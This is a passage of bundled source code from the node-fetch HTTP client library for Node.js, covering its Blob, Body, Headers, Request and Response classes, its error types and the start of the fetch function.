	text() {
		return Promise.resolve(this[BUFFER].toString());
	}
	arrayBuffer() {
		const buf = this[BUFFER];
		const ab = buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
		return Promise.resolve(ab);
	}
	stream() {
		const readable = new Readable();
		readable._read = function () {};
		readable.push(this[BUFFER]);
		readable.push(null);
		return readable;
	}
	toString() {
		return '[object Blob]';
	}
	slice() {
		const size = this.size;

		const start = arguments[0];
		const end = arguments[1];
		let relativeStart, relativeEnd;
		if (start === undefined) {
			relativeStart = 0;
		} else if (start < 0) {
			relativeStart = Math.max(size + start, 0);
		} else {
			relativeStart = Math.min(start, size);
		}
		if (end === undefined) {
			relativeEnd = size;
		} else if (end < 0) {
			relativeEnd = Math.max(size + end, 0);
		} else {
			relativeEnd = Math.min(end, size);
		}
		const span = Math.max(relativeEnd - relativeStart, 0);

		const buffer = this[BUFFER];
		const slicedBuffer = buffer.slice(relativeStart, relativeStart + span);
		const blob = new Blob([], { type: arguments[2] });
		blob[BUFFER] = slicedBuffer;
		return blob;
	}
}

Object.defineProperties(Blob.prototype, {
	size: { enumerable: true },
	type: { enumerable: true },
	slice: { enumerable: true }
});

Object.defineProperty(Blob.prototype, Symbol.toStringTag, {
	value: 'Blob',
	writable: false,
	enumerable: false,
	configurable: true
});

/**
 * fetch-error.js
 *
 * FetchError interface for operational errors
 */

/**
 * Create FetchError instance
 *
 * @param   String      message      Error message for human
 * @param   String      type         Error type for machine
 * @param   String      systemError  For Node.js system error
 * @return  FetchError
 */
function FetchError(message, type, systemError) {
  Error.call(this, message);

  this.message = message;
  this.type = type;

  // when err.type is `system`, err.code contains system error code
  if (systemError) {
    this.code = this.errno = systemError.code;
  }

  // hide custom error implementation details from end-users
  Error.captureStackTrace(this, this.constructor);
}

FetchError.prototype = Object.create(Error.prototype);
FetchError.prototype.constructor = FetchError;
FetchError.prototype.name = 'FetchError';

let convert;
try {
	convert = require('encoding').convert;
} catch (e) {}

const INTERNALS = Symbol('Body internals');

// fix an issue where "PassThrough" isn't a named export for node <10
const PassThrough = Stream.PassThrough;

/**
 * Body mixin
 *
 * Ref: https://fetch.spec.whatwg.org/#body
 *
 * @param   Stream  body  Readable stream
 * @param   Object  opts  Response options
 * @return  Void
 */
function Body(body) {
	var _this = this;

	var _ref = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {},
	    _ref$size = _ref.size;

	let size = _ref$size === undefined ? 0 : _ref$size;
	var _ref$timeout = _ref.timeout;
	let timeout = _ref$timeout === undefined ? 0 : _ref$timeout;

	if (body == null) {
		// body is undefined or null
		body = null;
	} else if (isURLSearchParams(body)) {
		// body is a URLSearchParams
		body = Buffer.from(body.toString());
	} else if (isBlob(body)) ; else if (Buffer.isBuffer(body)) ; else if (Object.prototype.toString.call(body) === '[object ArrayBuffer]') {
		// body is ArrayBuffer
		body = Buffer.from(body);
	} else if (ArrayBuffer.isView(body)) {
		// body is ArrayBufferView
		body = Buffer.from(body.buffer, body.byteOffset, body.byteLength);
	} else if (body instanceof Stream) ; else {
		// none of the above
		// coerce to string then buffer
		body = Buffer.from(String(body));
	}
	this[INTERNALS] = {
		body,
		disturbed: false,
		error: null
	};
	this.size = size;
	this.timeout = timeout;

	if (body instanceof Stream) {
		body.on('error', function (err) {
			const error = err.name === 'AbortError' ? err : new FetchError(`Invalid response body while trying to fetch ${_this.url}: ${err.message}`, 'system', err);
			_this[INTERNALS].error = error;
		});
	}
}

Body.prototype = {
	get body() {
		return this[INTERNALS].body;
	},

	get bodyUsed() {
		return this[INTERNALS].disturbed;
	},

	/**
  * Decode response as ArrayBuffer
  *
  * @return  Promise
  */
	arrayBuffer() {
		return consumeBody.call(this).then(function (buf) {
			return buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
		});
	},

	/**
  * Return raw response as Blob
  *
  * @return Promise
  */
	blob() {
		let ct = this.headers && this.headers.get('content-type') || '';
		return consumeBody.call(this).then(function (buf) {
			return Object.assign(
			// Prevent copying
			new Blob([], {
				type: ct.toLowerCase()
			}), {
				[BUFFER]: buf
			});
		});
	},

	/**
  * Decode response as json
  *
  * @return  Promise
  */
	json() {
		var _this2 = this;

		return consumeBody.call(this).then(function (buffer) {
			try {
				return JSON.parse(buffer.toString());
			} catch (err) {
				return Body.Promise.reject(new FetchError(`invalid json response body at ${_this2.url} reason: ${err.message}`, 'invalid-json'));
			}
		});
	},

	/**
  * Decode response as text
  *
  * @return  Promise
  */
	text() {
		return consumeBody.call(this).then(function (buffer) {
			return buffer.toString();
		});
	},

	/**
  * Decode response as buffer (non-spec api)
  *
  * @return  Promise
  */
	buffer() {
		return consumeBody.call(this);
	},

	/**
  * Decode response as text, while automatically detecting the encoding and
  * trying to decode to UTF-8 (non-spec api)
  *
  * @return  Promise
  */
	textConverted() {
		var _this3 = this;

		return consumeBody.call(this).then(function (buffer) {
			return convertBody(buffer, _this3.headers);
		});
	}
};

// In browsers, all properties are enumerable.
Object.defineProperties(Body.prototype, {
	body: { enumerable: true },
	bodyUsed: { enumerable: true },
	arrayBuffer: { enumerable: true },
	blob: { enumerable: true },
	json: { enumerable: true },
	text: { enumerable: true }
});

Body.mixIn = function (proto) {
	for (const name of Object.getOwnPropertyNames(Body.prototype)) {
		// istanbul ignore else: future proof
		if (!(name in proto)) {
			const desc = Object.getOwnPropertyDescriptor(Body.prototype, name);
			Object.defineProperty(proto, name, desc);
		}
	}
};

/**
 * Consume and convert an entire Body to a Buffer.
 *
 * Ref: https://fetch.spec.whatwg.org/#concept-body-consume-body
 *
 * @return  Promise
 */
function consumeBody() {
	var _this4 = this;

	if (this[INTERNALS].disturbed) {
		return Body.Promise.reject(new TypeError(`body used already for: ${this.url}`));
	}

	this[INTERNALS].disturbed = true;

	if (this[INTERNALS].error) {
		return Body.Promise.reject(this[INTERNALS].error);
	}

	let body = this.body;

	// body is null
	if (body === null) {
		return Body.Promise.resolve(Buffer.alloc(0));
	}

	// body is blob
	if (isBlob(body)) {
		body = body.stream();
	}

	// body is buffer
	if (Buffer.isBuffer(body)) {
		return Body.Promise.resolve(body);
	}

	// istanbul ignore if: should never happen
	if (!(body instanceof Stream)) {
		return Body.Promise.resolve(Buffer.alloc(0));
	}

	// body is stream
	// get ready to actually consume the body
	let accum = [];
	let accumBytes = 0;
	let abort = false;

	return new Body.Promise(function (resolve, reject) {
		let resTimeout;

		// allow timeout on slow response body
		if (_this4.timeout) {
			resTimeout = setTimeout(function () {
				abort = true;
				reject(new FetchError(`Response timeout while trying to fetch ${_this4.url} (over ${_this4.timeout}ms)`, 'body-timeout'));
			}, _this4.timeout);
		}

		// handle stream errors
		body.on('error', function (err) {
			if (err.name === 'AbortError') {
				// if the request was aborted, reject with this Error
				abort = true;
				reject(err);
			} else {
				// other errors, such as incorrect content-encoding
				reject(new FetchError(`Invalid response body while trying to fetch ${_this4.url}: ${err.message}`, 'system', err));
			}
		});

		body.on('data', function (chunk) {
			if (abort || chunk === null) {
				return;
			}

			if (_this4.size && accumBytes + chunk.length > _this4.size) {
				abort = true;
				reject(new FetchError(`content size at ${_this4.url} over limit: ${_this4.size}`, 'max-size'));
				return;
			}

			accumBytes += chunk.length;
			accum.push(chunk);
		});

		body.on('end', function () {
			if (abort) {
				return;
			}

			clearTimeout(resTimeout);

			try {
				resolve(Buffer.concat(accum, accumBytes));
			} catch (err) {
				// handle streams that have accumulated too much data (issue #414)
				reject(new FetchError(`Could not create Buffer from response body for ${_this4.url}: ${err.message}`, 'system', err));
			}
		});
	});
}

/**
 * Detect buffer encoding and convert to target encoding
 * ref: http://www.w3.org/TR/2011/WD-html5-20110113/parsing.html#determining-the-character-encoding
 *
 * @param   Buffer  buffer    Incoming buffer
 * @param   String  encoding  Target encoding
 * @return  String
 */
function convertBody(buffer, headers) {
	if (typeof convert !== 'function') {
		throw new Error('The package `encoding` must be installed to use the textConverted() function');
	}

	const ct = headers.get('content-type');
	let charset = 'utf-8';
	let res, str;

	// header
	if (ct) {
		res = /charset=([^;]*)/i.exec(ct);
	}

	// no charset in content type, peek at response body for at most 1024 bytes
	str = buffer.slice(0, 1024).toString();

	// html5
	if (!res && str) {
		res = /<meta.+?charset=(['"])(.+?)\1/i.exec(str);
	}

	// html4
	if (!res && str) {
		res = /<meta[\s]+?http-equiv=(['"])content-type\1[\s]+?content=(['"])(.+?)\2/i.exec(str);

		if (res) {
			res = /charset=(.*)/i.exec(res.pop());
		}
	}

	// xml
	if (!res && str) {
		res = /<\?xml.+?encoding=(['"])(.+?)\1/i.exec(str);
	}

	// found charset
	if (res) {
		charset = res.pop();

		// prevent decode issues when sites use incorrect encoding
		// ref: https://hsivonen.fi/encoding-menu/
		if (charset === 'gb2312' || charset === 'gbk') {
			charset = 'gb18030';
		}
	}

	// turn raw buffers into a single utf-8 buffer
	return convert(buffer, 'UTF-8', charset).toString();
}

/**
 * Detect a URLSearchParams object
 * ref: https://github.com/bitinn/node-fetch/issues/296#issuecomment-307598143
 *
 * @param   Object  obj     Object to detect by type or brand
 * @return  String
 */
function isURLSearchParams(obj) {
	// Duck-typing as a necessary condition.
	if (typeof obj !== 'object' || typeof obj.append !== 'function' || typeof obj.delete !== 'function' || typeof obj.get !== 'function' || typeof obj.getAll !== 'function' || typeof obj.has !== 'function' || typeof obj.set !== 'function') {
		return false;
	}

	// Brand-checking and more duck-typing as optional condition.
	return obj.constructor.name === 'URLSearchParams' || Object.prototype.toString.call(obj) === '[object URLSearchParams]' || typeof obj.sort === 'function';
}

/**
 * Check if `obj` is a W3C `Blob` object (which `File` inherits from)
 * @param  {*} obj
 * @return {boolean}
 */
function isBlob(obj) {
	return typeof obj === 'object' && typeof obj.arrayBuffer === 'function' && typeof obj.type === 'string' && typeof obj.stream === 'function' && typeof obj.constructor === 'function' && typeof obj.constructor.name === 'string' && /^(Blob|File)$/.test(obj.constructor.name) && /^(Blob|File)$/.test(obj[Symbol.toStringTag]);
}

/**
 * Clone body given Res/Req instance
 *
 * @param   Mixed  instance  Response or Request instance
 * @return  Mixed
 */
function clone(instance) {
	let p1, p2;
	let body = instance.body;

	// don't allow cloning a used body
	if (instance.bodyUsed) {
		throw new Error('cannot clone body after it is used');
	}

	// check that body is a stream and not form-data object
	// note: we can't clone the form-data object without having it as a dependency
	if (body instanceof Stream && typeof body.getBoundary !== 'function') {
		// tee instance body
		p1 = new PassThrough();
		p2 = new PassThrough();
		body.pipe(p1);
		body.pipe(p2);
		// set instance body to teed body and return the other teed body
		instance[INTERNALS].body = p1;
		body = p2;
	}

	return body;
}

/**
 * Performs the operation "extract a `Content-Type` value from |object|" as
 * specified in the specification:
 * https://fetch.spec.whatwg.org/#concept-bodyinit-extract
 *
 * This function assumes that instance.body is present.
 *
 * @param   Mixed  instance  Any options.body input
 */
function extractContentType(body) {
	if (body === null) {
		// body is null
		return null;
	} else if (typeof body === 'string') {
		// body is string
		return 'text/plain;charset=UTF-8';
	} else if (isURLSearchParams(body)) {
		// body is a URLSearchParams
		return 'application/x-www-form-urlencoded;charset=UTF-8';
	} else if (isBlob(body)) {
		// body is blob
		return body.type || null;
	} else if (Buffer.isBuffer(body)) {
		// body is buffer
		return null;
	} else if (Object.prototype.toString.call(body) === '[object ArrayBuffer]') {
		// body is ArrayBuffer
		return null;
	} else if (ArrayBuffer.isView(body)) {
		// body is ArrayBufferView
		return null;
	} else if (typeof body.getBoundary === 'function') {
		// detect form data input from form-data module
		return `multipart/form-data;boundary=${body.getBoundary()}`;
	} else if (body instanceof Stream) {
		// body is stream
		// can't really do much about this
		return null;
	} else {
		// Body constructor defaults other things to string
		return 'text/plain;charset=UTF-8';
	}
}

/**
 * The Fetch Standard treats this as if "total bytes" is a property on the body.
 * For us, we have to explicitly get it with a function.
 *
 * ref: https://fetch.spec.whatwg.org/#concept-body-total-bytes
 *
 * @param   Body    instance   Instance of Body
 * @return  Number?            Number of bytes, or null if not possible
 */
function getTotalBytes(instance) {
	const body = instance.body;


	if (body === null) {
		// body is null
		return 0;
	} else if (isBlob(body)) {
		return body.size;
	} else if (Buffer.isBuffer(body)) {
		// body is buffer
		return body.length;
	} else if (body && typeof body.getLengthSync === 'function') {
		// detect form data input from form-data module
		if (body._lengthRetrievers && body._lengthRetrievers.length == 0 || // 1.x
		body.hasKnownLength && body.hasKnownLength()) {
			// 2.x
			return body.getLengthSync();
		}
		return null;
	} else {
		// body is stream
		return null;
	}
}

/**
 * Write a Body to a Node.js WritableStream (e.g. http.Request) object.
 *
 * @param   Body    instance   Instance of Body
 * @return  Void
 */
function writeToStream(dest, instance) {
	const body = instance.body;


	if (body === null) {
		// body is null
		dest.end();
	} else if (isBlob(body)) {
		body.stream().pipe(dest);
	} else if (Buffer.isBuffer(body)) {
		// body is buffer
		dest.write(body);
		dest.end();
	} else {
		// body is stream
		body.pipe(dest);
	}
}

// expose Promise
Body.Promise = global.Promise;

/**
 * headers.js
 *
 * Headers class offers convenient helpers
 */

const invalidTokenRegex = /[^\^_`a-zA-Z\-0-9!#$%&'*+.|~]/;
const invalidHeaderCharRegex = /[^\t\x20-\x7e\x80-\xff]/;

function validateName(name) {
	name = `${name}`;
	if (invalidTokenRegex.test(name) || name === '') {
		throw new TypeError(`${name} is not a legal HTTP header name`);
	}
}

function validateValue(value) {
	value = `${value}`;
	if (invalidHeaderCharRegex.test(value)) {
		throw new TypeError(`${value} is not a legal HTTP header value`);
	}
}

/**
 * Find the key in the map object given a header name.
 *
 * Returns undefined if not found.
 *
 * @param   String  name  Header name
 * @return  String|Undefined
 */
function find(map, name) {
	name = name.toLowerCase();
	for (const key in map) {
		if (key.toLowerCase() === name) {
			return key;
		}
	}
	return undefined;
}

const MAP = Symbol('map');
class Headers {
	/**
  * Headers class
  *
  * @param   Object  headers  Response headers
  * @return  Void
  */
	constructor() {
		let init = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : undefined;

		this[MAP] = Object.create(null);

		if (init instanceof Headers) {
			const rawHeaders = init.raw();
			const headerNames = Object.keys(rawHeaders);

			for (const headerName of headerNames) {
				for (const value of rawHeaders[headerName]) {
					this.append(headerName, value);
				}
			}

			return;
		}

		// We don't worry about converting prop to ByteString here as append()
		// will handle it.
		if (init == null) ; else if (typeof init === 'object') {
			const method = init[Symbol.iterator];
			if (method != null) {
				if (typeof method !== 'function') {
					throw new TypeError('Header pairs must be iterable');
				}

				// sequence<sequence<ByteString>>
				// Note: per spec we have to first exhaust the lists then process them
				const pairs = [];
				for (const pair of init) {
					if (typeof pair !== 'object' || typeof pair[Symbol.iterator] !== 'function') {
						throw new TypeError('Each header pair must be iterable');
					}
					pairs.push(Array.from(pair));
				}

				for (const pair of pairs) {
					if (pair.length !== 2) {
						throw new TypeError('Each header pair must be a name/value tuple');
					}
					this.append(pair[0], pair[1]);
				}
			} else {
				// record<ByteString, ByteString>
				for (const key of Object.keys(init)) {
					const value = init[key];
					this.append(key, value);
				}
			}
		} else {
			throw new TypeError('Provided initializer must be an object');
		}
	}

	/**
  * Return combined header value given name
  *
  * @param   String  name  Header name
  * @return  Mixed
  */
	get(name) {
		name = `${name}`;
		validateName(name);
		const key = find(this[MAP], name);
		if (key === undefined) {
			return null;
		}

		return this[MAP][key].join(', ');
	}

	/**
  * Iterate over all headers
  *
  * @param   Function  callback  Executed for each item with parameters (value, name, thisArg)
  * @param   Boolean   thisArg   `this` context for callback function
  * @return  Void
  */
	forEach(callback) {
		let thisArg = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : undefined;

		let pairs = getHeaders(this);
		let i = 0;
		while (i < pairs.length) {
			var _pairs$i = pairs[i];
			const name = _pairs$i[0],
			      value = _pairs$i[1];

			callback.call(thisArg, value, name, this);
			pairs = getHeaders(this);
			i++;
		}
	}

	/**
  * Overwrite header values given name
  *
  * @param   String  name   Header name
  * @param   String  value  Header value
  * @return  Void
  */
	set(name, value) {
		name = `${name}`;
		value = `${value}`;
		validateName(name);
		validateValue(value);
		const key = find(this[MAP], name);
		this[MAP][key !== undefined ? key : name] = [value];
	}

	/**
  * Append a value onto existing header
  *
  * @param   String  name   Header name
  * @param   String  value  Header value
  * @return  Void
  */
	append(name, value) {
		name = `${name}`;
		value = `${value}`;
		validateName(name);
		validateValue(value);
		const key = find(this[MAP], name);
		if (key !== undefined) {
			this[MAP][key].push(value);
		} else {
			this[MAP][name] = [value];
		}
	}

	/**
  * Check for header name existence
  *
  * @param   String   name  Header name
  * @return  Boolean
  */
	has(name) {
		name = `${name}`;
		validateName(name);
		return find(this[MAP], name) !== undefined;
	}

	/**
  * Delete all header values given name
  *
  * @param   String  name  Header name
  * @return  Void
  */
	delete(name) {
		name = `${name}`;
		validateName(name);
		const key = find(this[MAP], name);
		if (key !== undefined) {
			delete this[MAP][key];
		}
	}

	/**
  * Return raw headers (non-spec api)
  *
  * @return  Object
  */
	raw() {
		return this[MAP];
	}

	/**
  * Get an iterator on keys.
  *
  * @return  Iterator
  */
	keys() {
		return createHeadersIterator(this, 'key');
	}

	/**
  * Get an iterator on values.
  *
  * @return  Iterator
  */
	values() {
		return createHeadersIterator(this, 'value');
	}

	/**
  * Get an iterator on entries.
  *
  * This is the default iterator of the Headers object.
  *
  * @return  Iterator
  */
	[Symbol.iterator]() {
		return createHeadersIterator(this, 'key+value');
	}
}
Headers.prototype.entries = Headers.prototype[Symbol.iterator];

Object.defineProperty(Headers.prototype, Symbol.toStringTag, {
	value: 'Headers',
	writable: false,
	enumerable: false,
	configurable: true
});

Object.defineProperties(Headers.prototype, {
	get: { enumerable: true },
	forEach: { enumerable: true },
	set: { enumerable: true },
	append: { enumerable: true },
	has: { enumerable: true },
	delete: { enumerable: true },
	keys: { enumerable: true },
	values: { enumerable: true },
	entries: { enumerable: true }
});

function getHeaders(headers) {
	let kind = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 'key+value';

	const keys = Object.keys(headers[MAP]).sort();
	return keys.map(kind === 'key' ? function (k) {
		return k.toLowerCase();
	} : kind === 'value' ? function (k) {
		return headers[MAP][k].join(', ');
	} : function (k) {
		return [k.toLowerCase(), headers[MAP][k].join(', ')];
	});
}

const INTERNAL = Symbol('internal');

function createHeadersIterator(target, kind) {
	const iterator = Object.create(HeadersIteratorPrototype);
	iterator[INTERNAL] = {
		target,
		kind,
		index: 0
	};
	return iterator;
}

const HeadersIteratorPrototype = Object.setPrototypeOf({
	next() {
		// istanbul ignore if
		if (!this || Object.getPrototypeOf(this) !== HeadersIteratorPrototype) {
			throw new TypeError('Value of `this` is not a HeadersIterator');
		}

		var _INTERNAL = this[INTERNAL];
		const target = _INTERNAL.target,
		      kind = _INTERNAL.kind,
		      index = _INTERNAL.index;

		const values = getHeaders(target, kind);
		const len = values.length;
		if (index >= len) {
			return {
				value: undefined,
				done: true
			};
		}

		this[INTERNAL].index = index + 1;

		return {
			value: values[index],
			done: false
		};
	}
}, Object.getPrototypeOf(Object.getPrototypeOf([][Symbol.iterator]())));

Object.defineProperty(HeadersIteratorPrototype, Symbol.toStringTag, {
	value: 'HeadersIterator',
	writable: false,
	enumerable: false,
	configurable: true
});

/**
 * Export the Headers object in a form that Node.js can consume.
 *
 * @param   Headers  headers
 * @return  Object
 */
function exportNodeCompatibleHeaders(headers) {
	const obj = Object.assign({ __proto__: null }, headers[MAP]);

	// http.request() only supports string as Host header. This hack makes
	// specifying custom Host header possible.
	const hostHeaderKey = find(headers[MAP], 'Host');
	if (hostHeaderKey !== undefined) {
		obj[hostHeaderKey] = obj[hostHeaderKey][0];
	}

	return obj;
}

/**
 * Create a Headers object from an object of headers, ignoring those that do
 * not conform to HTTP grammar productions.
 *
 * @param   Object  obj  Object of headers
 * @return  Headers
 */
function createHeadersLenient(obj) {
	const headers = new Headers();
	for (const name of Object.keys(obj)) {
		if (invalidTokenRegex.test(name)) {
			continue;
		}
		if (Array.isArray(obj[name])) {
			for (const val of obj[name]) {
				if (invalidHeaderCharRegex.test(val)) {
					continue;
				}
				if (headers[MAP][name] === undefined) {
					headers[MAP][name] = [val];
				} else {
					headers[MAP][name].push(val);
				}
			}
		} else if (!invalidHeaderCharRegex.test(obj[name])) {
			headers[MAP][name] = [obj[name]];
		}
	}
	return headers;
}

const INTERNALS$1 = Symbol('Response internals');

// fix an issue where "STATUS_CODES" aren't a named export for node <10
const STATUS_CODES = http.STATUS_CODES;

/**
 * Response class
 *
 * @param   Stream  body  Readable stream
 * @param   Object  opts  Response options
 * @return  Void
 */
class Response {
	constructor() {
		let body = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : null;
		let opts = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

		Body.call(this, body, opts);

		const status = opts.status || 200;
		const headers = new Headers(opts.headers);

		if (body != null && !headers.has('Content-Type')) {
			const contentType = extractContentType(body);
			if (contentType) {
				headers.append('Content-Type', contentType);
			}
		}

		this[INTERNALS$1] = {
			url: opts.url,
			status,
			statusText: opts.statusText || STATUS_CODES[status],
			headers,
			counter: opts.counter
		};
	}

	get url() {
		return this[INTERNALS$1].url || '';
	}

	get status() {
		return this[INTERNALS$1].status;
	}

	/**
  * Convenience property representing if the request ended normally
  */
	get ok() {
		return this[INTERNALS$1].status >= 200 && this[INTERNALS$1].status < 300;
	}

	get redirected() {
		return this[INTERNALS$1].counter > 0;
	}

	get statusText() {
		return this[INTERNALS$1].statusText;
	}

	get headers() {
		return this[INTERNALS$1].headers;
	}

	/**
  * Clone this response
  *
  * @return  Response
  */
	clone() {
		return new Response(clone(this), {
			url: this.url,
			status: this.status,
			statusText: this.statusText,
			headers: this.headers,
			ok: this.ok,
			redirected: this.redirected
		});
	}
}

Body.mixIn(Response.prototype);

Object.defineProperties(Response.prototype, {
	url: { enumerable: true },
	status: { enumerable: true },
	ok: { enumerable: true },
	redirected: { enumerable: true },
	statusText: { enumerable: true },
	headers: { enumerable: true },
	clone: { enumerable: true }
});

Object.defineProperty(Response.prototype, Symbol.toStringTag, {
	value: 'Response',
	writable: false,
	enumerable: false,
	configurable: true
});

const INTERNALS$2 = Symbol('Request internals');

// fix an issue where "format", "parse" aren't a named export for node <10
const parse_url = Url.parse;
const format_url = Url.format;

const streamDestructionSupported = 'destroy' in Stream.Readable.prototype;

/**
 * Check if a value is an instance of Request.
 *
 * @param   Mixed   input
 * @return  Boolean
 */
function isRequest(input) {
	return typeof input === 'object' && typeof input[INTERNALS$2] === 'object';
}

function isAbortSignal(signal) {
	const proto = signal && typeof signal === 'object' && Object.getPrototypeOf(signal);
	return !!(proto && proto.constructor.name === 'AbortSignal');
}

/**
 * Request class
 *
 * @param   Mixed   input  Url or Request instance
 * @param   Object  init   Custom options
 * @return  Void
 */
class Request {
	constructor(input) {
		let init = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

		let parsedURL;

		// normalize input
		if (!isRequest(input)) {
			if (input && input.href) {
				// in order to support Node.js' Url objects; though WHATWG's URL objects
				// will fall into this branch also (since their `toString()` will return
				// `href` property anyway)
				parsedURL = parse_url(input.href);
			} else {
				// coerce input to a string before attempting to parse
				parsedURL = parse_url(`${input}`);
			}
			input = {};
		} else {
			parsedURL = parse_url(input.url);
		}

		let method = init.method || input.method || 'GET';
		method = method.toUpperCase();

		if ((init.body != null || isRequest(input) && input.body !== null) && (method === 'GET' || method === 'HEAD')) {
			throw new TypeError('Request with GET/HEAD method cannot have body');
		}

		let inputBody = init.body != null ? init.body : isRequest(input) && input.body !== null ? clone(input) : null;

		Body.call(this, inputBody, {
			timeout: init.timeout || input.timeout || 0,
			size: init.size || input.size || 0
		});

		const headers = new Headers(init.headers || input.headers || {});

		if (inputBody != null && !headers.has('Content-Type')) {
			const contentType = extractContentType(inputBody);
			if (contentType) {
				headers.append('Content-Type', contentType);
			}
		}

		let signal = isRequest(input) ? input.signal : null;
		if ('signal' in init) signal = init.signal;

		if (signal != null && !isAbortSignal(signal)) {
			throw new TypeError('Expected signal to be an instanceof AbortSignal');
		}

		this[INTERNALS$2] = {
			method,
			redirect: init.redirect || input.redirect || 'follow',
			headers,
			parsedURL,
			signal
		};

		// node-fetch-only options
		this.follow = init.follow !== undefined ? init.follow : input.follow !== undefined ? input.follow : 20;
		this.compress = init.compress !== undefined ? init.compress : input.compress !== undefined ? input.compress : true;
		this.counter = init.counter || input.counter || 0;
		this.agent = init.agent || input.agent;
	}

	get method() {
		return this[INTERNALS$2].method;
	}

	get url() {
		return format_url(this[INTERNALS$2].parsedURL);
	}

	get headers() {
		return this[INTERNALS$2].headers;
	}

	get redirect() {
		return this[INTERNALS$2].redirect;
	}

	get signal() {
		return this[INTERNALS$2].signal;
	}

	/**
  * Clone this request
  *
  * @return  Request
  */
	clone() {
		return new Request(this);
	}
}

Body.mixIn(Request.prototype);

Object.defineProperty(Request.prototype, Symbol.toStringTag, {
	value: 'Request',
	writable: false,
	enumerable: false,
	configurable: true
});

Object.defineProperties(Request.prototype, {
	method: { enumerable: true },
	url: { enumerable: true },
	headers: { enumerable: true },
	redirect: { enumerable: true },
	clone: { enumerable: true },
	signal: { enumerable: true }
});

/**
 * Convert a Request to Node.js http request options.
 *
 * @param   Request  A Request instance
 * @return  Object   The options object to be passed to http.request
 */
function getNodeRequestOptions(request) {
	const parsedURL = request[INTERNALS$2].parsedURL;
	const headers = new Headers(request[INTERNALS$2].headers);

	// fetch step 1.3
	if (!headers.has('Accept')) {
		headers.set('Accept', '*/*');
	}

	// Basic fetch
	if (!parsedURL.protocol || !parsedURL.hostname) {
		throw new TypeError('Only absolute URLs are supported');
	}

	if (!/^https?:$/.test(parsedURL.protocol)) {
		throw new TypeError('Only HTTP(S) protocols are supported');
	}

	if (request.signal && request.body instanceof Stream.Readable && !streamDestructionSupported) {
		throw new Error('Cancellation of streamed requests with AbortSignal is not supported in node < 8');
	}

	// HTTP-network-or-cache fetch steps 2.4-2.7
	let contentLengthValue = null;
	if (request.body == null && /^(POST|PUT)$/i.test(request.method)) {
		contentLengthValue = '0';
	}
	if (request.body != null) {
		const totalBytes = getTotalBytes(request);
		if (typeof totalBytes === 'number') {
			contentLengthValue = String(totalBytes);
		}
	}
	if (contentLengthValue) {
		headers.set('Content-Length', contentLengthValue);
	}

	// HTTP-network-or-cache fetch step 2.11
	if (!headers.has('User-Agent')) {
		headers.set('User-Agent', 'node-fetch/1.0 (+https://github.com/bitinn/node-fetch)');
	}

	// HTTP-network-or-cache fetch step 2.15
	if (request.compress && !headers.has('Accept-Encoding')) {
		headers.set('Accept-Encoding', 'gzip,deflate');
	}

	let agent = request.agent;
	if (typeof agent === 'function') {
		agent = agent(parsedURL);
	}

	if (!headers.has('Connection') && !agent) {
		headers.set('Connection', 'close');
	}

	// HTTP-network fetch step 4.2
	// chunked encoding is handled by Node.js

	return Object.assign({}, parsedURL, {
		method: request.method,
		headers: exportNodeCompatibleHeaders(headers),
		agent
	});
}

/**
 * abort-error.js
 *
 * AbortError interface for cancelled requests
 */

/**
 * Create AbortError instance
 *
 * @param   String      message      Error message for human
 * @return  AbortError
 */
function AbortError(message) {
  Error.call(this, message);

  this.type = 'aborted';
  this.message = message;

  // hide custom error implementation details from end-users
  Error.captureStackTrace(this, this.constructor);
}

AbortError.prototype = Object.create(Error.prototype);
AbortError.prototype.constructor = AbortError;
AbortError.prototype.name = 'AbortError';

// fix an issue where "PassThrough", "resolve" aren't a named export for node <10
const PassThrough$1 = Stream.PassThrough;
const resolve_url = Url.resolve;

/**
 * Fetch function
 *
 * @param   Mixed    url   Absolute url or Request instance
 * @param   Object   opts  Fetch options
 * @return  Promise
 */
function fetch(url, opts) {

	// allow custom promise
	if (!fetch.Promise) {
		throw new Error('native promise missing, set fetch.Promise to your favorite alternative');
	}

	Body.Promise = fetch.Promise;

	// wrap http.request into fetch
	return new fetch.Promise(function (resolve, reject) {
		// build request object
		const request = new Request(url, opts);
		const options = getNodeRequestOptions(request);

		const send = (options.protocol === 'https:' ? https : http).request;
		const signal = request.signal;

		let response = null;

		const abort = function abort() {
			let error = new AbortError('The user aborted a request.');
			reject(error);
			if (request.body && request.body instanceof Stream.Readable) {
				request.body.destroy(error);
			}
			if (!response || !response.body) return;
			response.body.emit('error', error);
		};

		if (signal && signal.aborted) {
			abort();
			return;
		}

		const abortAndFinalize = function abortAndFinalize() {
			abort();
			finalize();
		};

		// send request
		const req = send(options);
		let reqTimeout;

		if (signal) {
			signal.addEventListener('abort', abortAndFinalize);
		}

		function finalize() {
			req.abort();
			if (signal) signal.removeEventListener('abort', abortAndFinalize);
			clearTimeout(reqTimeout);
		}

		if (request.timeout) {
			req.once('socket', function (socket) {
				reqTimeout = setTimeout(function () {
					reject(new FetchError(`network timeout at: ${request.url}`, 'request-timeout'));
					finalize();
				}, request.timeout);
			});
		}

		req.on('error', function (err) {
			reject(new FetchError(`request to ${request.url} failed, reason: ${err.message}`, 'system', err));
			finalize();
		});

		req.on('response', function (res) {
			clearTimeout(reqTimeout);

			const headers = createHeadersLenient(res.headers);

			// HTTP fetch step 5
			if (fetch.isRedirect(res.statusCode)) {
				// HTTP fetch step 5.2
				const location = headers.get('Location');

				// HTTP fetch step 5.3
				const locationURL = location === null ? null : resolve_url(request.url, location);

				// HTTP fetch step 5.5
				switch (request.redirect) {
					case 'error':
						reject(new FetchError(`redirect mode is set to error: ${request.url}`, 'no-redirect'));
						finalize();
						return;
					case 'manual':
						// node-fetch-specific step: make manual redirect a bit easier to use by setting the Location header value to the resolved URL.
						if (locationURL !== null) {
							// handle corrupted header
							try {
								headers.set('Location', locationURL);
							} catch (err) {
								// istanbul ignore next: nodejs server prevent invalid response headers, we can't test this through normal request
								reject(err);
							}
						}
						break;
					case 'follow':
						// HTTP-redirect fetch step 2
						if (locationURL === null) {
							break;
						}

						// HTTP-redirect fetch step 5
						if (request.counter >= request.follow) {
